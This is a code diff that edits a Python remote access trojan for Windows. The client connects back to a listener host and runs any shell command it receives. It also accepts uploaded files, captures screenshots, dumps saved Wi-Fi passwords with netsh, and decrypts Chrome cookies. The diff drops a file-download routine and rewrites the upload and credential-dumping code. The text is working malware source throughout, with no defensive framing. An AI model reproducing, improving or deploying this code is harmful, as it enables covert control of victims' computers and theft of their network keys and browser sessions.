@@ -9,7 +9,6 @@ import sqlite3
 import base64
 import json
 import win32crypt
-import io
 from Crypto.Cipher import AES
 
 HOST = '127.0.0.1'
@@ -48,8 +47,6 @@ def connect():
                 return s
             except Exception as e:
                 print(f"[!] Connection failed: {e}. Retrying in {CHECK_INTERVAL}s...")
-        else:
-            print("[*] No internet. Sleeping...")
         time.sleep(CHECK_INTERVAL)
 
 def handle_server(s):
@@ -64,7 +61,7 @@ def handle_server(s):
             if cmd.lower() == "cmd":
                 cmd = "ver && echo. && cd"
 
-            # --- Change Directory ---
+            # Change directory
             if cmd.lower().startswith("cd"):
                 path = cmd[3:].strip()
                 new_dir = os.path.join(cwd, path) if not os.path.isabs(path) else path
@@ -75,50 +72,32 @@ def handle_server(s):
                     s.sendall(b"The system cannot find the path specified.\n__end__")
                 continue
 
-            # --- Download File ---
-            if cmd.lower().startswith("download "):
-                try:
-                    filename = cmd[9:].strip()
-                    file_path = os.path.join(cwd, filename)
-                    if not os.path.isfile(file_path):
-                        s.sendall(f"[!] File not found: {filename}\n__end__".encode())
-                        continue
-                    with open(file_path, "rb") as f:
-                        data = f.read()
-                    s.sendall(f"FILE {len(data)}\n".encode())
-                    s.sendall(data)
-                except Exception as e:
-                    s.sendall(f"[!] Download error: {e}\n__end__".encode())
-                continue
-
-            # --- Upload File ---
+            # Upload file from listener
             if cmd.lower().startswith("upload "):
+                filename = cmd[7:].strip()
+                if not filename:
+                    s.sendall(b"[!] No filename provided.\n__end__")
+                    continue
+                s.sendall(b"[+] Ready to receive file\n")
+                # read file bytes from listener
+                total_data = b""
+                while True:
+                    data = s.recv(4096)
+                    if b"__end__" in data:
+                        total_data += data.replace(b"__end__", b"")
+                        break
+                    total_data += data
+                # save to cwd
                 try:
-                    parts = cmd.split(maxsplit=2)
-                    if len(parts) < 3:
-                        s.sendall(b"[!] Usage: upload <remote_path> <file_size>\n__end__")
-                        continue
-
-                    remote_path = parts[1].strip()
-                    expected_size = int(parts[2].strip())
-
-                    s.sendall(b"[+] Ready to receive file\n__end__")
-                    received_data = b""
-                    while len(received_data) < expected_size:
-                        chunk = s.recv(4096)
-                        if not chunk:
-                            break
-                        received_data += chunk
-
-                    with open(remote_path, "wb") as f:
-                        f.write(received_data)
-
-                    s.sendall(f"[+] File uploaded successfully to {remote_path}\n__end__".encode())
+                    path_on_client = os.path.join(cwd, filename)
+                    with open(path_on_client, "wb") as f:
+                        f.write(total_data)
+                    s.sendall(f"[+] File uploaded successfully to {path_on_client}\n__end__".encode())
                 except Exception as e:
-                    s.sendall(f"[!] Upload error: {e}\n__end__".encode())
+                    s.sendall(f"[!] Upload failed: {e}\n__end__".encode())
                 continue
 
-            # --- Screenshot ---
+            # Screenshot
             if cmd.lower() == "screenshot":
                 try:
                     temp_file = os.path.join(os.getenv("TEMP"), "scr_temp.png")
@@ -132,23 +111,17 @@ def handle_server(s):
                     s.sendall(f"[!] Screenshot error: {e}\n__end__".encode())
                 continue
 
-            # --- WiFi Dump ---
+            # Wi-Fi dump
             if cmd.lower() == "wifi_dump":
                 try:
                     result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
-                    profiles = []
-                    for line in result.stdout.splitlines():
-                        if "All User Profile" in line:
-                            name = line.split(":")[1].strip()
-                            profiles.append(name)
+                    profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
                     dump = ""
                     for profile in profiles:
-                        cmd_wifi = f'netsh wlan show profile "{profile}" key=clear'
-                        result = subprocess.run(cmd_wifi, shell=True, capture_output=True, text=True)
-                        for line in result.stdout.splitlines():
+                        res = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True, text=True)
+                        for line in res.stdout.splitlines():
                             if "Key Content" in line:
-                                password = line.split(":")[1].strip()
-                                dump += f"{profile}: {password}\n"
+                                dump += f"{profile}: {line.split(':')[1].strip()}\n"
                                 break
                         else:
                             dump += f"{profile}: [NO PASSWORD FOUND]\n"
@@ -159,7 +132,7 @@ def handle_server(s):
                     s.sendall(f"[!] Wi-Fi dump error: {e}\n__end__".encode())
                 continue
 
-            # --- Cookie Dump ---
+            # Cookie dump
             if cmd.lower() == "cookie_dump":
                 try:
                     cookie_db = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")
@@ -199,7 +172,7 @@ def handle_server(s):
                     s.sendall(f"[!] Cookie dump error: {e}\n__end__".encode())
                 continue
 
-            # --- Shell Command ---
+            # Shell command
             result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
             output = result.stdout + result.stderr
             if not output:
